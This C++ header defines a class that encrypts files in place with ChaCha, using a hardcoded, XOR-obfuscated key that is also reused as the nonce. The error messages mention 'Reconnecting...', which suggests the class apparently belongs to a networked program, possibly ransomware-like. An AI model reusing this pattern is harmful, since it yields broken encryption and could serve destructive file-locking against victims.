#pragma once

#include <boost/format.hpp>
#include "chacha.h"
#include "filters.h"



class Crypt
{
public:
    void cryptFile(const std::string& filePath)
    {
        auto key = GetEncyptionKey();
        CryptoPP::ChaCha::Encryption encryptor(key.data(), key.size(), key.data());
        auto fileData(ReadFileBytes(filePath));
        encryptor.ProcessData(fileData->data(), fileData->data(), fileData->size());
        WriteFileBytes(filePath, fileData);
    }

private:
    using encryptionKey = std::array<CryptoPP::byte, CryptoPP::ChaCha::MAX_KEYLENGTH>;
    encryptionKey GetEncyptionKey()
    {
        const std::string encryptedEncryptionKey{ "1111111111111111" };
        const std::string xorKey{ "key" };
        encryptionKey key{ 0 };

        for (int j = 0, i = 0; i < encryptedEncryptionKey.size(); i++)
        {
            if (j == xorKey.size())
                j = 0;

            key.at(i) = (encryptedEncryptionKey[i] ^ xorKey[j]);
            j++;
        }

        return key;
    }

    std::unique_ptr<std::vector<boost::asio::detail::buffered_stream_storage::byte_type>> ReadFileBytes(const std::string& filePath)
    {
        std::fstream inFile(filePath, std::ios::binary | std::ios::in);
        if (!inFile)
            throw std::fstream::failure((boost::format("Couldn't open the file: %1%   Reconnecting...") % filePath).str());

        auto fileData = std::make_unique<std::vector<unsigned char>>(std::vector<unsigned char>((std::istreambuf_iterator<char>(inFile)),
            std::istreambuf_iterator<char>()));

        inFile.close();
        return std::move(fileData);
    }
   
    void WriteFileBytes(const std::string& filePath, std::unique_ptr<std::vector<unsigned char>>& fileData)
    {
        std::fstream outFile(filePath, std::ios::binary | std::ios::out);
        if (!outFile)
            throw std::fstream::failure((boost::format("Couldn't open the file: %1%   Reconnecting...") % filePath).str());

        outFile.write(reinterpret_cast<const char*>(fileData->data()), fileData->size());
        outFile.close();
    }

};